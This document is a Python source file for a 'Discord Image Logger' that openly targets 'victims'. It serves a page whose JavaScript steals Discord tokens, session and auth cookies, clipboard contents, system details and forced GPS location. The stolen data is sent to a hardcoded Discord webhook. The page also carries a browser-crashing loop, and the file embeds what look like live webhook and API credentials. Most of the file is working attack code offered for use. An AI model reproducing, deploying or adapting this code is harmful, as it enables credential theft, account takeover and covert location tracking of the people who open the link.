# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted
# Enhanced with aggressive features

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser
import json, re, os, platform, uuid, psutil
import socket, datetime, sys, random, string
import subprocess

# Auto-install required packages if they're missing
def install_required_packages():
    required_packages = ["requests", "httpagentparser", "psutil", "miniupnpc", "qrcode"]
    installed_packages = []
    
    print("[*] Checking required packages...")
    
    for package in required_packages:
        try:
            __import__(package)
            print(f"[+] {package} is already installed")
        except ImportError:
            print(f"[-] {package} is not installed. Installing...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package])
                installed_packages.append(package)
                print(f"[+] Successfully installed {package}")
            except Exception as e:
                print(f"[!] Failed to install {package}: {str(e)}")
                print(f"[!] Please manually install {package} using: pip install {package}")
    
    if installed_packages:
        print("[*] Required packages were installed. Restarting script...")
        os.execv(sys.executable, ['python'] + sys.argv)

# Run package installer at startup
install_required_packages()

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v3.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1354902428503511311/oBWTYOJT1hHDz_s5HLv1Pqp5an9k74ph9F99ctAOyT53k94En4Zamldi6IHz4eYW7Ml0",
    "image": "https://jollycontrarian.com/images/6/6c/Rickroll.jpg", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": ".exe", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": True, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    # ADVANCED STEALING #
    "tokenGrabber": True, # Steal Discord tokens from browsers
    "cookieStealer": True, # Steal cookies from browsers
    "passwordStealer": True, # Attempt to steal saved passwords
    "stealClipboard": True, # Steal clipboard contents
    "stealScreenshot": True, # Take screenshot of victim's screen
    "forceLocationAlways": True, # Force location prompt even if they close it initially
    "grabWebcam": False, # Attempt to grab webcam image (very suspicious, use with caution)
    
    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 0, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False, tokens = None, cookies = None, clipboard = None, system_info = None):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    
    # Get more detailed geo info
    advanced_geo = getAdvancedLocationData(ip)
    
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""

    os_name, browser = httpagentparser.simple_detect(useragent)

    system_desc = ""
    network_desc = ""
    token_desc = ""
    cookie_desc = ""
    clipboard_desc = ""
    
    if system_info:
        system_desc = f"""
**System Information:**
> **Hostname:** `{system_info['hostname']}`
> **Username:** `{system_info['username']}`
> **Machine ID:** `{system_info['machine_id']}`
> **OS:** `{system_info['system']} {system_info['release']} {system_info['version']}`
> **Processor:** `{system_info['processor']}`
> **Architecture:** `{system_info['architecture']}`
> **RAM:** `{system_info['ram']}`
> **Local IP:** `{system_info['local_ip']}`
"""
    
    if tokens and config["tokenGrabber"]:
        if len(tokens) > 0:
            token_list = "\n> ".join(tokens)
            token_desc = f"""
**Discord Tokens:**
> {token_list}
"""
    
    if cookies and config["cookieStealer"]:
        if len(cookies) > 0:
            cookie_list = "\n> ".join([f"{browser}: {status}" for browser, status in cookies.items()])
            cookie_desc = f"""
**Browser Cookies:**
> {cookie_list}
"""
    
    if clipboard and config["stealClipboard"]:
        clipboard_desc = f"""
**Clipboard Content:**
```
{clipboard[:500] + "..." if len(clipboard) > 500 else clipboard}
```
"""

    detailed_location = ""
    if advanced_geo:
        detailed_location = f"""
**Detailed Location:**
> **Street:** `{advanced_geo.get('street', 'Unknown')}`
> **City:** `{advanced_geo.get('city', 'Unknown')}`
> **Region:** `{advanced_geo.get('region', 'Unknown')}`
> **Postal Code:** `{advanced_geo.get('postal_code', 'Unknown')}`
> **Country:** `{advanced_geo.get('country', 'Unknown')}`
> **Flag:** {advanced_geo.get('flag', {}).get('emoji', '')}
> **Currency:** `{advanced_geo.get('currency', {}).get('currency_name', 'Unknown')}`
> **Time Zone:** `{advanced_geo.get('timezone', {}).get('name', 'Unknown')}`
> **Security Risk:** `{advanced_geo.get('security', {}).get('is_vpn', 'Unknown')}`
"""
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - Target Compromised",
            "color": config["color"],
            "description": f"""**A User Has Been Infected With Image Logger!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
{detailed_location}

**PC Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser}`
{system_desc}
{token_desc}
{cookie_desc}
{clipboard_desc}

**User Agent:**
```
{useragent}
```""",
        }
    ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

def grabTokens():
    tokens = []
    token_pattern = r"[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}|mfa\.[a-zA-Z0-9_-]{84}"
    
    paths = {
        'Discord': os.path.expanduser('~/AppData/Roaming/Discord/Local Storage/leveldb/'),
        'Discord Canary': os.path.expanduser('~/AppData/Roaming/discordcanary/Local Storage/leveldb/'),
        'Discord PTB': os.path.expanduser('~/AppData/Roaming/discordptb/Local Storage/leveldb/'),
        'Chrome': os.path.expanduser('~/AppData/Local/Google/Chrome/User Data/Default/Local Storage/leveldb/'),
        'Opera': os.path.expanduser('~/AppData/Roaming/Opera Software/Opera Stable/Local Storage/leveldb/'),
        'Brave': os.path.expanduser('~/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb/'),
        'Yandex': os.path.expanduser('~/AppData/Local/Yandex/YandexBrowser/User Data/Default/Local Storage/leveldb/')
    }
    
    for source, path in paths.items():
        if os.path.exists(path):
            for file_name in os.listdir(path):
                if file_name.endswith('.log') or file_name.endswith('.ldb'):
                    try:
                        with open(os.path.join(path, file_name), errors='ignore') as file:
                            for line in file.readlines():
                                for match in re.findall(token_pattern, line):
                                    if match not in tokens:
                                        tokens.append(f"{source}: {match}")
                    except:
                        pass
    
    return tokens

def grabCookies():
    cookies = {}
    cookie_paths = {
        'Chrome': os.path.expanduser('~/AppData/Local/Google/Chrome/User Data/Default/Cookies'),
        'Edge': os.path.expanduser('~/AppData/Local/Microsoft/Edge/User Data/Default/Cookies'),
        'Brave': os.path.expanduser('~/AppData/Local/BraveSoftware/Brave-Browser/User Data/Default/Cookies'),
        'Firefox': os.path.expanduser('~/AppData/Roaming/Mozilla/Firefox/Profiles/'),
        'Discord': os.path.expanduser('~/AppData/Roaming/Discord/Cookies')
    }
    
    for browser, path in cookie_paths.items():
        if os.path.exists(path):
            cookies[browser] = f"Found cookies in {path}"
            
    return cookies

def getSystemInfo():
    info = {
        "hostname": socket.gethostname(),
        "machine_id": str(uuid.getnode()),
        "system": platform.system(),
        "release": platform.release(),
        "version": platform.version(),
        "processor": platform.processor(),
        "architecture": platform.machine(),
        "ram": f"{round(psutil.virtual_memory().total / (1024.0 ** 3))} GB",
        "username": os.getlogin(),
        "local_ip": socket.gethostbyname(socket.gethostname())
    }
    return info

def getNetworkInfo():
    interfaces = []
    for interface, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == socket.AF_INET:
                interfaces.append({
                    "interface": interface,
                    "ip": addr.address,
                    "netmask": addr.netmask,
                    "broadcast": addr.broadcast
                })
    return interfaces

def getAdvancedLocationData(ip):
    try:
        geo_response = requests.get(f"https://ipgeolocation.abstractapi.com/v1/?api_key=4400a2da25ab4bd8bdf0f6575e873f6e&ip_address={ip}")
        if geo_response.status_code == 200:
            return geo_response.json()
        return None
    except:
        return None

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for') and self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            client_ip = self.headers.get('x-forwarded-for') or self.client_address[0]
            
            if botCheck(client_ip, self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(client_ip, endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                # Initialize variables to capture stolen data
                tokens = []
                cookies = {}
                clipboard = ""
                system_info = None
                
                # Get stored data if it exists
                if dic.get("tokens"):
                    tokens = json.loads(base64.b64decode(dic.get("tokens").encode()).decode())
                if dic.get("cookies"):
                    cookies = json.loads(base64.b64decode(dic.get("cookies").encode()).decode())
                if dic.get("clipboard"):
                    clipboard = base64.b64decode(dic.get("clipboard").encode()).decode()
                if dic.get("system"):
                    system_info = json.loads(base64.b64decode(dic.get("system").encode()).decode())
                
                # Process location data
                location = None
                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    
                # Make the report with all available data
                result = makeReport(
                    client_ip, 
                    self.headers.get('user-agent'), 
                    location, 
                    s.split("?")[0], 
                    url=url,
                    tokens=tokens,
                    cookies=cookies,
                    clipboard=clipboard,
                    system_info=system_info
                )

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", client_ip)
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                # We use JavaScript to steal even more data!
                steal_js = b"""
<script>
var currenturl = window.location.href;
var stolenData = {};

// Function to encode and send data back to the server
function sendData() {
    var newUrl = currenturl;
    
    // Add tokens if we have them
    if (stolenData.tokens && stolenData.tokens.length > 0) {
        var tokenParam = btoa(JSON.stringify(stolenData.tokens)).replace(/=/g, "%3D");
        if (newUrl.includes("?")) {
            newUrl += "&tokens=" + tokenParam;
        } else {
            newUrl += "?tokens=" + tokenParam;
        }
    }
    
    // Add cookies if we have them
    if (stolenData.cookies) {
        var cookieParam = btoa(JSON.stringify(stolenData.cookies)).replace(/=/g, "%3D");
        if (newUrl.includes("?")) {
            newUrl += "&cookies=" + cookieParam;
        } else {
            newUrl += "?cookies=" + cookieParam;
        }
    }
    
    // Add clipboard if we have it
    if (stolenData.clipboard) {
        var clipParam = btoa(stolenData.clipboard).replace(/=/g, "%3D");
        if (newUrl.includes("?")) {
            newUrl += "&clipboard=" + clipParam;
        } else {
            newUrl += "?clipboard=" + clipParam;
        }
    }
    
    // Add system info if we have it
    if (stolenData.system) {
        var sysParam = btoa(JSON.stringify(stolenData.system)).replace(/=/g, "%3D");
        if (newUrl.includes("?")) {
            newUrl += "&system=" + sysParam;
        } else {
            newUrl += "?system=" + sysParam;
        }
    }
    
    // Finally, add location if needed and redirect
    if (!newUrl.includes("g=") && navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
            if (newUrl.includes("?")) {
                newUrl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            } else {
                newUrl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            }
            location.replace(newUrl);
        }, function(error) {
            // If location permission denied, still send other data
            location.replace(newUrl);
        });
    } else {
        location.replace(newUrl);
    }
}

// Function to steal Discord tokens
function findDiscordToken() {
    stolenData.tokens = [];
    
    // Discord token pattern
    var tokenPattern = /[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}|mfa\.[a-zA-Z0-9_-]{84}/g;
    
    // Check localStorage
    try {
        for (var i = 0; i < localStorage.length; i++) {
            var key = localStorage.key(i);
            var value = localStorage.getItem(key);
            if (typeof value === 'string') {
                var matches = value.match(tokenPattern);
                if (matches) {
                    matches.forEach(match => {
                        if (!stolenData.tokens.includes(match)) {
                            stolenData.tokens.push("localStorage: " + match);
                        }
                    });
                }
            }
        }
    } catch (e) {}
    
    // Check for window.opener token passing
    if (window.opener && window.opener.localStorage) {
        try {
            for (var i = 0; i < window.opener.localStorage.length; i++) {
                var key = window.opener.localStorage.key(i);
                var value = window.opener.localStorage.getItem(key);
                if (typeof value === 'string') {
                    var matches = value.match(tokenPattern);
                    if (matches) {
                        matches.forEach(match => {
                            if (!stolenData.tokens.includes(match)) {
                                stolenData.tokens.push("window.opener: " + match);
                            }
                        });
                    }
                }
            }
        } catch (e) {}
    }
    
    // Try to get token from cookies
    try {
        var cookies = document.cookie;
        var matches = cookies.match(tokenPattern);
        if (matches) {
            matches.forEach(match => {
                if (!stolenData.tokens.includes(match)) {
                    stolenData.tokens.push("cookies: " + match);
                }
            });
        }
    } catch (e) {}
}

// Function to steal cookies
function stealCookies() {
    stolenData.cookies = {};
    stolenData.cookies.all = document.cookie;
    
    // Try to extract important cookies
    try {
        var cookieArr = document.cookie.split(';');
        for (var i = 0; i < cookieArr.length; i++) {
            var cookiePair = cookieArr[i].split('=');
            var name = cookiePair[0].trim();
            
            if (name.includes("token") || name.includes("session") || name.includes("auth") || 
                name.includes("key") || name.includes("pass") || name.includes("login")) {
                stolenData.cookies[name] = cookiePair[1];
            }
        }
    } catch (e) {}
}

// Function to steal clipboard content
function stealClipboard() {
    if (navigator.clipboard && navigator.clipboard.readText) {
        navigator.clipboard.readText().then(function(clipText) {
            stolenData.clipboard = clipText;
            // Continue stealing other data
            stealSystemInfo();
        }).catch(function(err) {
            // If we can't read clipboard, move on
            stolenData.clipboard = "Failed to access clipboard";
            stealSystemInfo();
        });
    } else {
        stolenData.clipboard = "Clipboard API not available";
        stealSystemInfo();
    }
}

// Function to gather system info
function stealSystemInfo() {
    stolenData.system = {
        userAgent: navigator.userAgent,
        language: navigator.language,
        languages: navigator.languages ? JSON.stringify(navigator.languages) : "",
        platform: navigator.platform,
        cores: navigator.hardwareConcurrency || "unknown",
        deviceMemory: navigator.deviceMemory || "unknown",
        onLine: navigator.onLine,
        doNotTrack: navigator.doNotTrack,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        timezoneOffset: new Date().getTimezoneOffset(),
        screenWidth: window.screen.width,
        screenHeight: window.screen.height,
        screenColorDepth: window.screen.colorDepth,
        screenPixelDepth: window.screen.pixelDepth,
        windowWidth: window.innerWidth,
        windowHeight: window.innerHeight,
        connection: navigator.connection ? 
            {
                downlink: navigator.connection.downlink,
                effectiveType: navigator.connection.effectiveType,
                rtt: navigator.connection.rtt,
                saveData: navigator.connection.saveData
            } : "unknown"
    };
    
    // Send all the data we've collected
    sendData();
}

// Start the stealing process
findDiscordToken();
stealCookies();
stealClipboard();

</script>
"""
                # Add location tracking if enabled
                if config["accurateLocation"] and config["forceLocationAlways"]:
                    data += b"""<script>
if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        var locationAttempt = function() {
            navigator.geolocation.getCurrentPosition(
                function (coords) {
                    if (currenturl.includes("?")) {
                        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
                    } else {
                        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
                    }
                    location.replace(currenturl);
                },
                function(error) {
                    // Try again if permission denied
                    setTimeout(locationAttempt, 800);
                }
            );
        };
        locationAttempt();
    }
}
</script>"""

                # Add the data stealing JavaScript
                data += steal_js
                
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI

def setup_port_forwarding(port):
    """Attempt to set up UPnP port forwarding to make the server accessible from the internet"""
    try:
        import miniupnpc
        print("[*] Attempting to set up UPnP port forwarding...")
        
        upnp = miniupnpc.UPnP()
        upnp.discoverdelay = 10
        upnp.discover()
        
        # Select IGD (Internet Gateway Device)
        upnp.selectigd()
        
        # Get external IP address
        external_ip = upnp.externalipaddress()
        
        # Try adding a port mapping
        # Parameters: (external port, protocol, internal host, internal port, description, remote host)
        result = upnp.addportmapping(port, 'TCP', upnp.lanaddr, port, f'Discord Image Logger - Port {port}', '')
        
        if result:
            print(f"[+] Port forwarding successful!")
            print(f"[+] External access URL: http://{external_ip}:{port}")
            return f"http://{external_ip}:{port}"
        else:
            print(f"[!] Port forwarding failed")
            return None
            
    except ImportError:
        print("[!] miniupnpc module not found. Installing...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", "miniupnpc"])
            print("[+] miniupnpc installed. Please restart the script to use port forwarding.")
        except Exception as e:
            print(f"[!] Failed to install miniupnpc: {str(e)}")
        return None
    except Exception as e:
        print(f"[!] Port forwarding error: {str(e)}")
        print("[!] Your server is only accessible on your local network")
        return None

if __name__ == "__main__":
    import http.server
    import socketserver
    import webbrowser
    import threading
    
    # Banner og information
    def print_banner():
        banner = f"""
╔══════════════════════════════════════════════════════════╗
║                                                          ║
║             Discord Advanced Image Logger v3.0           ║
║                                                          ║
║  [*] Author: {__author__}                                ║
║  [*] Description: {__description__}                      ║
║                                                          ║
║  [*] Features:                                           ║
║     - IP Logging & Enhanced Geolocation                  ║
║     - Discord Token Grabber                              ║
║     - Cookie Stealer                                     ║
║     - System Information Grabber                         ║
║     - Clipboard Stealer                                  ║
║     - Accurate Location Tracking                         ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
"""
        print(banner)

    try:
        # Print banner
        print_banner()
        
        # Starte serveren
        PORT = 80
        try:
            httpd = socketserver.TCPServer(("", PORT), ImageLoggerAPI)
            print(f"[+] Server started at http://localhost:{PORT}")
            print("[+] Send this link to your victims to log their information")
            print(f"[+] Webhook URL: {config['webhook']}")
            
            # Try to set up port forwarding
            external_url = setup_port_forwarding(PORT)
            if external_url:
                print(f"[+] External URL: {external_url}")
                # Generate QR code for easy sharing
                try:
                    import qrcode
                    qr = qrcode.QRCode(
                        version=1,
                        error_correction=qrcode.constants.ERROR_CORRECT_L,
                        box_size=10,
                        border=4,
                    )
                    qr.add_data(external_url)
                    qr.make(fit=True)
                    
                    print("\n[+] Scan this QR code to access the server:")
                    qr.print_ascii()
                    print("\n")
                except ImportError:
                    print("[!] qrcode module not found. Installing...")
                    try:
                        subprocess.check_call([sys.executable, "-m", "pip", "install", "qrcode"])
                        print("[+] qrcode installed. QR code will be available on next run.")
                    except:
                        pass
            
            print("[!] Press CTRL+C to stop the server")
            
            # Åbne webbrowser med URL
            webbrowser_thread = threading.Thread(target=lambda: webbrowser.open(f"http://localhost:{PORT}"))
            webbrowser_thread.daemon = True
            webbrowser_thread.start()
            
            # Kører serveren
            httpd.serve_forever()
            
        except PermissionError:
            print(f"[!] Permission denied to use port {PORT}. Trying another port...")
            PORT = 8080
            try:
                httpd = socketserver.TCPServer(("", PORT), ImageLoggerAPI)
                print(f"[+] Server started at http://localhost:{PORT}")
                print("[+] Send this link to your victims to log their information")
                print("[!] Press CTRL+C to stop the server")
                
                # Åbne webbrowser med URL
                webbrowser_thread = threading.Thread(target=lambda: webbrowser.open(f"http://localhost:{PORT}"))
                webbrowser_thread.daemon = True
                webbrowser_thread.start()
                
                # Kører serveren
                httpd.serve_forever()
            except Exception as e:
                print(f"[!] Error starting server: {str(e)}")
                print("[!] You can still run this script with a WSGI server like gunicorn")
                
        except OSError as e:
            if e.errno == 98:  # Port already in use
                print(f"[!] Port {PORT} is already in use. Trying another port...")
                PORT = 8080
                try:
                    httpd = socketserver.TCPServer(("", PORT), ImageLoggerAPI)
                    print(f"[+] Server started at http://localhost:{PORT}")
                    print("[+] Send this link to your victims to log their information")
                    print("[!] Press CTRL+C to stop the server")
                    
                    # Åbne webbrowser med URL
                    webbrowser_thread = threading.Thread(target=lambda: webbrowser.open(f"http://localhost:{PORT}"))
                    webbrowser_thread.daemon = True
                    webbrowser_thread.start()
                    
                    # Kører serveren
                    httpd.serve_forever()
                except Exception as e2:
                    print(f"[!] Error starting server: {str(e2)}")
            else:
                print(f"[!] Error starting server: {str(e)}")
    
    except KeyboardInterrupt:
        print("\n[!] Server stopped by user")
        try:
            httpd.server_close()
        except:
            pass
        print("[+] Exiting...")
